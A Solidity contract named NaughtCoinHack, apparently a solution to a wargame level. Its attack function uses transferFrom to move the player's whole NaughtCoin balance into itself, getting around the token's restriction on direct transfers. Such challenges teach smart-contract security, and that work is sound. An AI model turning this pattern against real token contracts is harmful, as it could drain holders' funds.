// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "./NaughtCoin.sol";

contract NaughtCoinHack {
    function attack(address _target) external {
        NaughtCoin target = NaughtCoin(_target);
        address player = target.player();
        uint256 amount = target.balanceOf(player);
        target.transferFrom(player, address(this), amount);
    }
}
